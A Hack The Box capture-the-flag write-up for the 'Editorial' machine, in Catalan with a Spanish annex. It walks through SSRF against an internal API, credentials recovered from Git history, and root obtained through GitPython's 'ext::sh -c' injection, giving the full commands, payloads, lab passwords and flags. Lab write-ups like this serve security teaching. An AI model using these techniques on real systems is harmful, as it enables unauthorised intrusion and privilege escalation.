# HTB Editorial — Informe tècnic complet

## 1. Introducció del cas

**Editorial** és una màquina Linux de dificultat Easy de Hack The Box orientada a explotació web, abús de relacions de confiança internes i escalada local mitjançant la revisió d'artefactes de desenvolupament.

La cadena validada de compromís va ser:

```text
Enumeració inicial
→ identificació de l'aplicació web Nginx
→ anàlisi de /upload
→ SSRF a /upload-cover mitjançant bookurl
→ accés indirecte a una API interna a 127.0.0.1:5000
→ credencials de dev
→ SSH com dev
→ revisió del repositori Git a ~/apps
→ credencials històriques de prod
→ sudo sobre un script Python amb GitPython
→ execució com a root
→ lectura de root.txt
```

La lliçó principal és que la superfície web pública no s'ha de tractar com un element aïllat. El lloc no donava accés directe, però exposava una funcionalitat que feia que el backend recuperés una URL indicada per l'usuari. Un cop validada, aquesta primitiva va permetre fer peticions a `localhost` des de la perspectiva del servidor objectiu i descobrir una API interna que no apareixia a l'escaneig extern de Nmap.

La segona lliçó és de post-explotació: un repositori Git aparentment buit, o amb fitxers eliminats, pot conservar un historial molt valuós. En aquest cas, l'historial contenia una credencial antiga de producció que va permetre passar de `dev` a `prod`.

### Fets verificats principals

- La IP inicial va ser `10.129.33.109`.
- Després de recrear la instància per netejar l'entorn, la IP va passar a `10.129.33.149`.
- Els ports oberts inicials van ser `22/tcp` i `80/tcp`.
- El port 80 servia una web Nginx que redirigia a `editorial.htb`.
- `/upload` exposava un formulari de publicació amb el camp `bookurl`.
- `/upload-cover` feia una petició des del backend a la URL indicada per l'usuari.
- La SSRF va permetre consultar `127.0.0.1:5000`.
- `/api/latest/metadata/messages/authors` va exposar credencials de `dev`.
- Les credencials de `dev` van permetre accés SSH.
- A `/home/dev/apps` hi havia un repositori Git.
- Un commit històric va revelar credencials de `prod`.
- `prod` podia executar `/opt/internal_apps/clone_changes/clone_prod_change.py` com a `root`.
- L'script utilitzava GitPython `3.1.29` i `Repo.clone_from()` amb una URL controlada.
- L'execució com a root es va confirmar escrivint la sortida de `id` a `/tmp/root_check`.
- La flag de root es va obtenir escrivint `/root/root.txt` a `/tmp/root_flag`.

### Inferències raonables

- El TTL `63` suggeria Linux, reforçat després pels banners d'OpenSSH i Nginx sobre Ubuntu.
- El camp `bookurl` suggeria una possible petició HTTP sortint des del backend, però la SSRF només es va donar per validada quan es va rebre un callback real.
- `127.0.0.1:5000` semblava una API interna perquè responia de manera diferent i retornava `404` a `/`, demostrant que hi havia un servei encara que l'arrel no fos útil.
- El commit `change(api): downgrading prod to dev` es va considerar sensible perquè suggeria substitució de configuració de producció per configuració de desenvolupament.
- La combinació de `sudo`, GitPython, `Repo.clone_from()`, entrada controlada i `protocol.ext.allow=always` indicava una via probable d'escalada via GitPython/CVE-2022-24439.

### Incidències operatives, no troballes d'explotació

- `HEAD /upload → 500` es va tractar com un comportament anòmal, no com a via principal, perquè `GET /upload` funcionava.
- `curl: (23) Failure writing output to destination` era un problema local de sortida, no de l'objectiu.
- `WARNING: terminal is not fully functional` afectava el paginador de Git.
- Escriure la contrasenya directament a Bash va provocar `event not found` pel caràcter `!`; la credencial seguia sent vàlida.
- Una prova benigna va embrutar `/opt/internal_apps/clone_changes/` i va requerir recrear la instància.

---

## 2. Preparació i arrencada

El cas va començar amb l'script `Inici-HTB`, que organitza l'espai de treball, fixa l'objectiu, comprova connectivitat, enumera ports i perfila serveis abans de qualsevol intent d'explotació.

```bash
Inici-HTB EDITORIAL 10.129.33.109
```

La connectivitat es va validar amb `ping`:

```text
64 bytes from 10.129.33.109: icmp_seq=1 ttl=63 time=38.4 ms
1 packets transmitted, 1 received, 0% packet loss
```

El fet important era confirmar que la ruta VPN de HTB funcionava i que no hi havia cap problema bàsic de xarxa bloquejant el laboratori.

---

## 3. Enumeració inicial de ports i serveis

La superfície TCP inicial era molt reduïda:

```text
22/tcp open  ssh
80/tcp open  http
```

L'escaneig de serveis mostrava:

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

### Interpretació

- `22/tcp` era SSH, però sense credencials només quedava com a superfície secundària.
- `80/tcp` era HTTP i revelava el hostname `editorial.htb`.
- La redirecció demostrava dependència del virtual host.

La branca principal va passar a ser **WEB-BASE**, amb SSH pendent de credencials.

Es va afegir el hostname localment:

```bash
echo "10.129.33.109 editorial.htb" | sudo tee -a /etc/hosts
```

---

## 4. Observació web base

Amb el hostname resolt, es va revisar la web de manera passiva:

```bash
curl -sS -I http://editorial.htb
curl -sS http://editorial.htb | head -n 60
whatweb http://editorial.htb
curl -sS http://editorial.htb/robots.txt
curl -sS http://editorial.htb   | grep -oP 'href="\K[^"]+|src="\K[^"]+'   | sort -u
curl -sS http://editorial.htb   | grep -Ei 'login|signin|admin|panel|auth|password|reset|forgot|api|graphql|ajax|upload|cover|book|publish'
```

La web responia amb `HTTP/1.1 200 OK` a través de `nginx/1.18.0 (Ubuntu)`. `whatweb` va detectar Bootstrap, HTML5, Nginx i el títol `Editorial Tiempo Arriba`.

No es va observar login, panell administratiu ni CMS. `robots.txt` retornava `404 Not Found`.

La ruta important era:

```text
/upload
```

A la navegació apareixia com:

```text
Publish with us
```

### Interpretació

La web semblava corporativa, però `/upload` representava una funcionalitat real de negoci: enviament editorial. Com que ja apareixia a l'HTML, era més útil revisar-la que fer fuzzing ampli.

---

## 5. Anàlisi de `/upload` i detecció del flux real

La ruta es va revisar amb:

```bash
curl -sS -I http://editorial.htb/upload
curl -sS http://editorial.htb/upload | head -n 120
curl -sS http://editorial.htb/upload   | grep -Ei 'form|input|textarea|button|method|action|enctype|file|url|upload|cover|book'
curl -sS http://editorial.htb/upload   | grep -oP 'name="\K[^"]+|action="\K[^"]+|method="\K[^"]+|type="\K[^"]+'   | sort -u
```

`GET /upload` retornava `Publish Your Book With Us`. `HEAD /upload` retornava `500 INTERNAL SERVER ERROR`, fet que es va anotar però no es va usar com a via principal.

Hi havia dos fluxos:

1. Formulari principal d'enviament editorial.
2. Formulari de previsualització de portada.

El formulari rellevant era:

```html
<form id="form-cover" method="post" enctype="multipart/form-data">
  <input type="text" name="bookurl" id="bookurl" placeholder="Cover URL related to your book or">
  <input type="file" name="bookfile" id="bookfile">
  <button type="submit" id="button-cover">Preview</button>
</form>
```

El JavaScript l'enviava via AJAX:

```javascript
var formData = new FormData(document.getElementById('form-cover'));
xhr.open('POST', '/upload-cover');
...
document.getElementById('bookcover').src = imgUrl;
xhr.send(formData);
```

L'endpoint clau passava a ser:

```text
POST /upload-cover
```

I el paràmetre clau:

```text
bookurl
```

La SSRF encara era una hipòtesi: si el backend recuperava `bookurl`, una URL cap a la màquina atacant havia de generar una connexió sortint.

---

## 6. Confirmació de SSRF a `/upload-cover`

Es va preparar un fitxer buit per al camp `bookfile`:

```bash
touch /tmp/empty-bookfile
```

Es va aixecar un listener:

```bash
nc -lnvp 5555
```

I es va enviar una petició controlada:

```bash
curl -sS -X POST http://editorial.htb/upload-cover   -F "bookurl=http://10.10.15.26:5555/"   -F "bookfile=@/tmp/empty-bookfile"
```

L'aplicació retornava la imatge per defecte:

```text
/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```

Però el listener rebia:

```http
GET / HTTP/1.1
Host: 10.10.15.26:5555
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

### Interpretació

La petició entrant confirmava la SSRF. El `User-Agent` indicava ús de Python `requests`, i la branca activa canviava de WEB-BASE a exploració de serveis interns mitjançant SSRF.

---

## 7. Exploració de serveis interns amb SSRF

Primer es va provar `127.0.0.1:80`:

```bash
curl -sS -X POST http://editorial.htb/upload-cover   -F "bookurl=http://127.0.0.1:80/"   -F "bookfile=@/tmp/empty-bookfile"
```

Retornava la imatge per defecte. Després es va provar `127.0.0.1:5000`:

```bash
curl -sS -X POST http://editorial.htb/upload-cover   -F "bookurl=http://127.0.0.1:5000/"   -F "bookfile=@/tmp/empty-bookfile"
```

Ara la resposta era diferent:

```text
static/uploads/41438411-4d2d-4d2e-b5ff-860d5a7832fe
```

L'artefacte es va descarregar:

```bash
mkdir -p loot notes scans
curl -sS http://editorial.htb/static/uploads/41438411-4d2d-4d2e-b5ff-860d5a7832fe   -o loot/ssrf_127.0.0.1_5000
file loot/ssrf_127.0.0.1_5000
cat loot/ssrf_127.0.0.1_5000 | jq
```

El fitxer era HTML, no JSON:

```text
HTML document, ASCII text
parse error: Invalid numeric literal at line 1, column 10
```

El contingut mostrava un `404 Not Found`. Això no descartava el servei: demostrava que existia a port 5000, però que `/` no era útil.

---

## 8. Consulta de l'endpoint intern d'autors

L'endpoint útil era:

```text
/api/latest/metadata/messages/authors
```

Es va consultar mitjançant la SSRF:

```bash
RESP=$(curl -sS -X POST http://editorial.htb/upload-cover   -F "bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors"   -F "bookfile=@/tmp/empty-bookfile")

echo "$RESP"

curl -sS "http://editorial.htb/$RESP" -o loot/ssrf_authors.json
file loot/ssrf_authors.json
cat loot/ssrf_authors.json | jq
```

La petició va retornar un recurs JSON descarregable amb contingut rellevant:

```json
{
  "template_mail_message": "Welcome to the team! ...\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\n..."
}
```

Credencials recuperades:

```text
Usuari: dev
Contrasenya: dev080217_devAPI!@
```

La branca activa va passar a:

```text
SSRF / API interna → Credencials → Validació SSH
```

---

## 9. Accés SSH com `dev` i flag d'usuari

Les credencials es van provar per SSH:

```bash
ssh dev@10.129.33.109
```

Contrasenya:

```text
dev080217_devAPI!@
```

L'autenticació va funcionar. Es va validar el context:

```bash
id
hostname
pwd
ls -la
cat user.txt
```

Sortida rellevant:

```text
uid=1001(dev) gid=1001(dev) groups=1001(dev)
hostname: editorial
pwd: /home/dev
```

Flag d'usuari:

```text
717c0463923c0970cef9be01cca8d726
```

La troballa dominant després del foothold era:

```text
/home/dev/apps
```

Això suggeria revisar codi, configuració i historial Git.

---

## 10. Enumeració local del repositori Git

Dins de `~/apps`:

```bash
cd ~/apps
pwd
ls -la
find . -maxdepth 3 -type d -name ".git" -o -type f | sort | head -n 80
```

El directori només contenia `.git`, cosa que indicava que el working tree havia estat eliminat, però l'historial seguia present.

`git status` mostrava fitxers eliminats com:

```text
deleted: app_api/app.py
deleted: app_editorial/app.py
deleted: app_editorial/templates/upload.html
...
```

El problema del paginador es va resoldre amb:

```bash
export PAGER=cat
export GIT_PAGER=cat
stty sane
git --no-pager log --oneline --decorate --all
```

Historial:

```text
8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```

El commit més interessant era:

```text
b73481b change(api): downgrading prod to dev
```

Suggeria substitució de configuració de producció per desenvolupament.

---

## 11. Extracció de credencials històriques des de Git

Es va inspeccionar el commit i el fitxer concret:

```bash
git --no-pager show b73481b
git --no-pager show b73481b -- app_api/app.py
git --no-pager show b73481b -- app_api/app.py   | grep -Ei 'user|username|pass|password|credential|prod|dev'
```

Diff rellevant:

```diff
- Username: prod
- Password: 080217_Producti0n_2023!@
+ Username: dev
+ Password: dev080217_devAPI!@
```

Credencials recuperades:

```text
Usuari: prod
Contrasenya: 080217_Producti0n_2023!@
```

Això va permetre moviment lateral local.

---

## 12. Moviment lateral a `prod`

La credencial es va validar localment:

```bash
su prod
```

Contrasenya:

```text
080217_Producti0n_2023!@
```

Validació:

```bash
id
whoami
pwd
hostname
```

Sortida:

```text
uid=1000(prod) gid=1000(prod) groups=1000(prod)
whoami: prod
hostname: editorial
```

`sudo -l` mostrava:

```text
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

L'asterisc final indicava que l'usuari controlava un argument passat a un script executat com a root.

---

## 13. Anàlisi de l'script privilegiat

Es va revisar l'script:

```bash
ls -la /opt/internal_apps/clone_changes/
ls -la /opt/internal_apps/clone_changes/clone_prod_change.py
file /opt/internal_apps/clone_changes/clone_prod_change.py
sed -n '1,200p' /opt/internal_apps/clone_changes/clone_prod_change.py
```

Permisos:

```text
-rwxr-x--- 1 root prod 256 Jun  4  2024 clone_prod_change.py
```

Contingut:

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Versió de GitPython:

```text
GitPython: 3.1.29
```

Senyals crítics:

- Executat com a `root` via `sudo`.
- Fa servir `sys.argv[1]` com a URL controlada per `prod`.
- Crida `Repo.clone_from()`.
- Habilita `protocol.ext.allow=always`.
- Escriu dins de `/opt/internal_apps/clone_changes`.

Candidata d'escalada:

```text
Identificador: CVE-2022-24439
Component: GitPython
Versió observada: 3.1.29
Context: script executat com a root via sudo
Entrada controlada: sys.argv[1]
Funció sensible: Repo.clone_from()
Senyal crític: protocol.ext.allow=always
Prioritat: alta
```

---

## 14. Validació benigna del flux privilegiat

Es va crear un repositori local benign:

```bash
cd /tmp
rm -rf benign_repo benign_clone_test
mkdir benign_repo
cd benign_repo
git init
echo "test benigno editorial" > README.md
git add README.md
git commit -m "benign test"
```

El commit va fallar perquè Git no tenia identitat configurada:

```text
Author identity unknown
fatal: unable to auto-detect email address
```

Tot i així, es va provar l'script privilegiat:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py file:///tmp/benign_repo
```

El resultat mostrava un directori propietat de root:

```text
drwxr-xr-x 3 root root 4096 Apr 24 14:59 new_changes
/opt/internal_apps/clone_changes/new_changes: directory
```

Això confirmava execució com a root, però embrutava el directori i requeria una instància neta.

---

## 15. Restauració de l'entorn després de la prova benigna

Reobrir SSH no netejava els artefactes creats. Va caldre recrear realment la instància. La IP va canviar de:

```text
10.129.33.109
```

a:

```text
10.129.33.149
```

Es van actualitzar hosts i objectiu:

```bash
sudo sed -i '/editorial.htb/d' /etc/hosts
echo "10.129.33.149 editorial.htb" | sudo tee -a /etc/hosts
settarget 10.129.33.149 EDITORIAL
```

Es va recuperar l'accés:

```bash
ssh dev@10.129.33.149
su prod
```

El directori privilegiat tornava a estar net:

```text
total 12
drwxr-x--- 2 root     prod     4096 Jun  5  2024 .
drwxr-xr-x 5 www-data www-data 4096 Jun  5  2024 ..
-rwxr-x--- 1 root     prod      256 Jun  4  2024 clone_prod_change.py
```

Incidències com escriure `su pro` o introduir la contrasenya a Bash van ser errors operatius, no troballes d'explotació.

---

## 16. Execució com a root mitjançant GitPython

No hi havia accés root directe:

```bash
id
whoami
hostname
pwd
cat /root/root.txt
```

La lectura directa fallava:

```text
cat: /root/root.txt: Permission denied
```

El primer intent va fallar pel format de remote-ext:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c id%>/tmp/root_check'
```

Error:

```text
fatal: Bad remote-ext placeholder '%>'.
```

Es va corregir afegint un espai després de `%`:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c id% >/tmp/root_check'
```

Git acabava amb error:

```text
fatal: Could not read from remote repository.
```

Però l'efecte lateral demostrava execució com a root:

```bash
cat /tmp/root_check 2>&1
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

La lliçó clau és que un error final de Git no vol dir que la comanda no s'hagi executat.

---

## 17. Obtenció de root

Es va utilitzar la mateixa primitiva per llegir `/root/root.txt`:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >/tmp/root_flag'
```

Git va retornar error, però el fitxer de sortida contenia la flag:

```bash
cat /tmp/root_flag 2>&1
```

```text
cdcea83d12a66309ca7eb4085ffdd8b8
```

Flags finals:

```text
user.txt: 717c0463923c0970cef9be01cca8d726
root.txt: cdcea83d12a66309ca7eb4085ffdd8b8
```

Cadena validada:

```text
WEB-BASE
→ SSRF a /upload-cover
→ API interna a 127.0.0.1:5000
→ credencials dev
→ SSH com dev
→ repositori Git a ~/apps
→ credencials històriques prod
→ sudo sobre clone_prod_change.py
→ GitPython / remote-ext
→ execució com a root
→ root.txt
```

---

## 18. Resum tècnic final

### Punt d'entrada

El punt d'entrada va ser una SSRF a `/upload-cover`, activada pel paràmetre `bookurl` del formulari de previsualització de portada.

### Primitiva inicial

El backend feia una petició HTTP a la URL indicada per l'usuari. Això es va confirmar amb un listener `nc` que va rebre una connexió des de l'objectiu amb `User-Agent: python-requests/2.25.1`.

### Pivot intern

La SSRF va permetre accedir a `127.0.0.1:5000`, on hi havia una API interna. `/` retornava `404`, però `/api/latest/metadata/messages/authors` retornava credencials.

### Foothold

`dev / dev080217_devAPI!@` va permetre accés SSH i lectura de `user.txt`.

### Moviment lateral

L'historial Git a `/home/dev/apps` exposava credencials de producció:

```text
prod / 080217_Producti0n_2023!@
```

Aquestes credencials van permetre canviar a `prod`.

### Escalada

`prod` podia executar com a `root`:

```text
/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

L'script utilitzava GitPython `3.1.29`, `Repo.clone_from()` i `protocol.ext.allow=always` amb una URL controlada.

### Root

Es va obtenir execució root no interactiva i `/root/root.txt` es va escriure a `/tmp/root_flag`.

---

## 19. Lliçons reutilitzables

### 1. Una web corporativa pot amagar una acció backend crítica

La pàgina principal no tenia login ni panell. El valor era en una funcionalitat de negoci: previsualitzar una portada des d'una URL.

```text
Formulari amb URL externa → comprovar si el backend sol·licita aquesta URL → validar SSRF amb listener
```

### 2. La SSRF s'ha de validar amb evidència externa

Un camp anomenat `url` no és suficient. La SSRF es va confirmar quan el servidor va connectar al listener controlat.

### 3. `localhost` s'ha de llegir des de la perspectiva del servidor

`http://127.0.0.1:5000/` apunta al servidor objectiu, no a la màquina atacant.

### 4. Un `404` a `/` no descarta una API interna

El servei existia; faltava trobar un endpoint vàlid.

### 5. L'historial Git pot ser més valuós que el working tree

Els fitxers eliminats no importaven perquè `.git` conservava l'historial.

### 6. Una credencial s'ha de validar, no assumir

La credencial de `prod` només va quedar confirmada quan `su prod` va funcionar i es va verificar el context.

### 7. `sudo -l` mostra entrades controlables

`clone_prod_change.py *` era crític perquè l'usuari controlava l'argument URL.

### 8. La versió d'una llibreria importa dins d'un context explotable

GitPython `3.1.29` importava perquè s'usava dins d'un script executat com a root amb entrada controlada.

### 9. Les proves benignes també poden modificar estat

La prova de clonatge local confirmava root, però creava artefactes propietat de root.

### 10. Un error final d'eina no sempre prova fracàs

Git fallava, però `/tmp/root_check` i `/tmp/root_flag` demostraven que la comanda s'havia executat.

---

---
# Anexo A — Registro cronológico depurado

Este anexo presenta una secuencia operativa depurada del caso, centrada en comandos, salidas y evidencias útiles para consulta posterior.

## A.1 Preparación inicial y descubrimiento de servicios

```bash
Inici-HTB EDITORIAL 10.129.33.109
```

Salida relevante:

```text
PING 10.129.33.109 (10.129.33.109) 56(84) bytes of data.
64 bytes from 10.129.33.109: icmp_seq=1 ttl=63 time=38.4 ms

22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
80/tcp open  http  nginx 1.18.0 (Ubuntu)
http-title: Did not follow redirect to http://editorial.htb
```

Configuración local del virtual host:

```bash
echo "10.129.33.109 editorial.htb" | sudo tee -a /etc/hosts
```

## A.2 Observación web base

```bash
curl -sS -I http://editorial.htb
curl -sS http://editorial.htb | head -n 60
whatweb http://editorial.htb
curl -sS http://editorial.htb/robots.txt
curl -sS http://editorial.htb \
  | grep -oP 'href="\K[^"]+|src="\K[^"]+' \
  | sort -u
```

Salida relevante:

```text
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Title: Editorial Tiempo Arriba
robots.txt: 404 Not Found
/upload
```

La ruta `/upload` quedó priorizada porque correspondía a una funcionalidad real de publicación.

## A.3 Análisis de `/upload`

```bash
curl -sS -I http://editorial.htb/upload
curl -sS http://editorial.htb/upload | head -n 120
curl -sS http://editorial.htb/upload \
  | grep -Ei 'form|input|textarea|button|method|action|enctype|file|url|upload|cover|book'
```

Elementos relevantes del formulario:

```text
<form id="form-cover" method="post" enctype="multipart/form-data">
<input type="text" name="bookurl" id="bookurl">
<input type="file" name="bookfile" id="bookfile">
xhr.open('POST', '/upload-cover');
```

El endpoint relevante pasó a ser `POST /upload-cover` con el parámetro `bookurl`.

## A.4 Confirmación de SSRF

Listener local:

```bash
nc -lnvp 5555
```

Petición de validación:

```bash
touch /tmp/empty-bookfile
curl -sS -X POST http://editorial.htb/upload-cover \
  -F "bookurl=http://10.10.15.26:5555/" \
  -F "bookfile=@/tmp/empty-bookfile"
```

Evidencia recibida en el listener:

```http
GET / HTTP/1.1
Host: 10.10.15.26:5555
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

La conexión entrante confirmó que el servidor realizaba peticiones HTTP hacia la URL indicada.

## A.5 Enumeración de servicios internos mediante SSRF

Prueba contra el puerto interno 5000:

```bash
curl -sS -X POST http://editorial.htb/upload-cover \
  -F "bookurl=http://127.0.0.1:5000/" \
  -F "bookfile=@/tmp/empty-bookfile"
```

Salida relevante:

```text
static/uploads/41438411-4d2d-4d2e-b5ff-860d5a7832fe
```

Descarga e inspección:

```bash
mkdir -p loot notes scans
curl -sS http://editorial.htb/static/uploads/41438411-4d2d-4d2e-b5ff-860d5a7832fe \
  -o loot/ssrf_127.0.0.1_5000
file loot/ssrf_127.0.0.1_5000
head -n 80 loot/ssrf_127.0.0.1_5000
```

Salida relevante:

```html
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
```

El servicio existía, pero la ruta `/` no era el endpoint útil.

## A.6 Extracción de credenciales desde la API interna

```bash
RESP=$(curl -sS -X POST http://editorial.htb/upload-cover \
  -F "bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors" \
  -F "bookfile=@/tmp/empty-bookfile")

echo "$RESP"
curl -sS "http://editorial.htb/$RESP" -o loot/ssrf_authors.json
file loot/ssrf_authors.json
cat loot/ssrf_authors.json | jq
```

Salida relevante:

```json
{
  "template_mail_message": "... Username: dev\nPassword: dev080217_devAPI!@ ..."
}
```

Credenciales recuperadas:

```text
Usuario: dev
Contraseña: dev080217_devAPI!@
```

## A.7 Acceso SSH y flag de usuario

```bash
ssh dev@10.129.33.109
id
hostname
pwd
ls -la
cat user.txt
```

Salida relevante:

```text
uid=1001(dev) gid=1001(dev) groups=1001(dev)
hostname: editorial
pwd: /home/dev
user.txt: 717c0463923c0970cef9be01cca8d726
```

## A.8 Revisión del repositorio Git

```bash
cd ~/apps
pwd
ls -la
find . -maxdepth 3 -type d -name ".git" -o -type f | sort | head -n 80
git status
export PAGER=cat
export GIT_PAGER=cat
stty sane
git --no-pager log --oneline --decorate --all
```

Salida relevante:

```text
/home/dev/apps
.git
8ad0f31 fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```

## A.9 Credenciales históricas de `prod`

```bash
git --no-pager show b73481b -- app_api/app.py
git --no-pager show b73481b -- app_api/app.py \
  | grep -Ei 'user|username|pass|password|credential|prod|dev'
```

Diff relevante:

```diff
- Username: prod
- Password: 080217_Producti0n_2023!@
+ Username: dev
+ Password: dev080217_devAPI!@
```

Credenciales recuperadas:

```text
Usuario: prod
Contraseña: 080217_Producti0n_2023!@
```

## A.10 Movimiento lateral y revisión de `sudo`

```bash
su prod
id
whoami
hostname
pwd
sudo -l
```

Salida relevante:

```text
uid=1000(prod) gid=1000(prod) groups=1000(prod)
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

## A.11 Análisis del script privilegiado

```bash
ls -la /opt/internal_apps/clone_changes/
ls -la /opt/internal_apps/clone_changes/clone_prod_change.py
file /opt/internal_apps/clone_changes/clone_prod_change.py
sed -n '1,200p' /opt/internal_apps/clone_changes/clone_prod_change.py
python3 - <<'PY'
import git
print(git.__version__)
PY
```

Contenido relevante:

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')
url_to_clone = sys.argv[1]
r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Versión observada:

```text
GitPython: 3.1.29
```

## A.12 Validación controlada del flujo privilegiado

```bash
cd /tmp
rm -rf benign_repo benign_clone_test
mkdir benign_repo
cd benign_repo
git init
echo "test benigno editorial" > README.md
git add README.md
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py file:///tmp/benign_repo
ls -la /opt/internal_apps/clone_changes/
```

Salida relevante:

```text
drwxr-xr-x 3 root root 4096 Apr 24 14:59 new_changes
```

La prueba confirmó ejecución como `root`, pero alteró el directorio de trabajo del script. Para recuperar el estado limpio se recreó la instancia de la máquina.

## A.13 Recreación de instancia y estado limpio

La instancia se recreó y la IP cambió a `10.129.33.149`.

```bash
sudo sed -i '/editorial.htb/d' /etc/hosts
echo "10.129.33.149 editorial.htb" | sudo tee -a /etc/hosts
settarget 10.129.33.149 EDITORIAL
ssh dev@10.129.33.149
su prod
ls -la /opt/internal_apps/clone_changes/
```

Estado limpio observado:

```text
total 12
drwxr-x--- 2 root     prod     4096 Jun  5  2024 .
drwxr-xr-x 5 www-data www-data 4096 Jun  5  2024 ..
-rwxr-x--- 1 root     prod      256 Jun  4  2024 clone_prod_change.py
```

## A.14 Ejecución como root y lectura de la flag final

Validación de ejecución como `root`:

```bash
cd /tmp
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c id% >/tmp/root_check'
cat /tmp/root_check 2>&1
```

Salida relevante:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Lectura de `root.txt`:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >/tmp/root_flag'
cat /tmp/root_flag 2>&1
```

Salida relevante:

```text
cdcea83d12a66309ca7eb4085ffdd8b8
```

La máquina se completó con `user.txt` y `root.txt` recuperadas.
